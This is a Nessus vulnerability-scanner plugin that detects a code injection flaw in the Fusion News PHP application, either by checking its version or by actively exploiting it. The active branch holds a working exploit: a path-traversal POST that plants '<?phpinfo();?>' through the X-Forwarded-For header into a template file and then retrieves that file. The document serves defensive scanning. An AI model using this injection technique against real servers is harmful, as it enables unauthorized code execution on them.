#
# (C) Tenable Network Security
#


  desc["english"] = "
Synopsis :

The remote web server contains a PHP application that is susceptible to
arbitrary code injection.

Description :

The version of Fusion News installed on the remote host suffers from a
flaw that allows a remote attacker to execute arbitrary PHP code within
the context of the web server userid. 

See also : 

http://downloads.securityfocus.com/vulnerabilities/exploits/fusion.php

Solution : 

Unknown at this time.

Risk factor : 

High / CVSS Base Score : 7
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
  script_id(18302);
  script_version("$Revision: 1.3 $");
  script_bugtraq_id(13661);

  name["english"] = "Fusion News X-Forwarded-For Code Injection Vulnerability";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for X-Forwarded-For code injection vulnerability in Fusion News";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# For each CGI directory...
foreach dir (cgi_dirs()) {
  # Grab the affected script.
  req = http_get(item:string(dir, "/comments.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it looks like Fusion News...
  pat = "<title>f u s i o n : n e w s";
  if (egrep(string:res, pattern:pat, icase:TRUE)) {
    # If safe checks are enabled...
    if (safe_checks()) {
      # Try to get the version number from fusionnews.xml.
      req = http_get(item:string(dir, "/fusionnews.xml"), port:port);
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (res == NULL) exit(0);

      pat = "<generator>Fusion News ([^<]+)</generator>";
      matches = egrep(pattern:pat, string:res, icase:TRUE);
      foreach match (split(matches)) {
        match = chomp(match);
        ver = eregmatch(pattern:pat, string:match);
        if (!isnull(ver)) {
          ver = ver[1];
          break;
        }
      }

      # If that failed, try to get it from language.db.
      if (isnull(ver)) {
        req = http_get(item:string(dir, "/language.db"), port:port);
        res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
        if (res == NULL) exit(0);

        pat = "^fusion news (.+)$";
        matches = egrep(pattern:pat, string:res, icase:TRUE);
        foreach match (split(matches)) {
          match = chomp(match);
          ver = eregmatch(pattern:pat, string:match);
          if (!isnull(ver)) {
            ver = ver[1];
            break;
          }
        }
      }

      # Check the version number if we have it.
      if (
        ver &&
        # nb: 3.6.1 and lower are affected.
        ver =~ "^([0-2]\.|3\.([0-5]\.|6($|\.1[^0-9]?)))"
      ) {
        report = string(
          desc["english"],
          "\n\n",
          "Plugin output :\n",
          "\n",
          "Nessus has determined the vulnerability exists on the remote\n",
          "host simply by looking at the version number of Fusion News\n",
          "installed there.\n"
        );
        security_hole(port:port, data:report);
        exit(0);
      }
    }
    # Otherwise...
    else {
      # Try to exploit the flaw.
      fname = string(rand_str(), "-", SCRIPT_NAME);
      postdata = string(
        "name=test&",
        "email=&",
        "fullnews=test&",
        "chars=297&",
        "com_Submit=Submit&",
        "pass="
      );
      req = string(
        "POST ", dir, "/comments.php?mid=post&id=/../../templates/", fname, " HTTP/1.1\r\n",
        "Host: ", get_host_name(), "\r\n",
        "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
        "Connection: Keep-Alive\r\n",
        "Cache-Control: no-cache\r\n",
        "X-FORWARDED-FOR: <?phpinfo();?>\r\n",
        "Content-Type: application/x-www-form-urlencoded\r\n",
        "Content-Length: ", strlen(postdata), "\r\n",
        "\r\n",
        postdata
      );
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (res == NULL) exit(0);

      # Wait for a bit to get around the flood protection 
      # (default is 30 seconds).
      sleep(31);

      # NB: if the file specified by 'fname' doesn't yet exist (it shouldn't),
      #     it's necessary to do this a second time for writes to appear.
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (res == NULL) exit(0);

      # Now try to retrieve the template.
      req = http_get(item:string(dir, "/templates/", fname, ".php"), port:port);
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (res == NULL) exit(0);

      # There's a problem if it looks like the output of phpinfo().
      if ("PHP Version" >< res) {
        report = string(
          desc["english"],
          "\n\n",
          "Plugin output :\n",
          "\n",
          "Nessus has successfully exploited this vulnerability by uploading\n",
          "a 'template' with PHP code that reveals information about the PHP\n",
          "configuration on the remote host. The file is located under the\n",
          "web server's document directory as:\n",
          "         ", dir, "templates/", fname, ".php\n",
          "You are strongly encouraged to delete this file as soon as\n",
          "possible as it can be run by anyone who accesses it.\n"
        );
        security_hole(port:port, data:report);
        exit(0);
      }
    }
  }
}
